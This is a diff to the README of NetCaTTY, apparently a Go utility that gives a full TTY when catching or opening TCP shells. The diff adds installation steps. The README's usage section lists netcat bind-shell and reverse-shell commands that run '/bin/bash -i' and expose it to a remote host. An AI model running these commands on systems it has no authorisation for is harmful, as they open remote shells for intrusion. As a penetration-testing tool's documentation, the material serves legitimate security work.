@@ -1,6 +1,7 @@
 # NetCaTTY
 
-A simple socket listener that gives you a TTY.
+A simple TCP socket utility that gives you a TTY.
+Either by listening or by connecting.
 
 ## Why do I need a TTY?
 
@@ -12,19 +13,31 @@ shell, such as Ctrl-C or Ctrl-Z.
 It should be noted that not only bash/sh work, but any type of interactive
 terminal command, such as php or python.
 
-Please don't hurt puppers or kitties with them!
+Please don't hurt puppers or kitties with it!
 
 ### Bind shell
 
 Target machine (with IP 192.168.1.1): `nc -e "/bin/bash -i" -lp 4444`
+
 Your terminal: `./netcatty -a 192.168.1.1:4444`
 
 ### Reverse shell
 
 Target machine: `nc -e "/bin/bash -i" 192.168.1.100 4444`
+
 Your terminal (with IP 192.168.1.100): `./netcatty -l :4444`
 
-## Arguments
+## Installation
+
+Compile it on your own:
+
+```bash
+git clone https://github.com/dzervas/netcatty
+cd netcatty
+go run netcatty.go -h
+```
+
+## Usage
 
 ```
 Usage of ./netcatty:
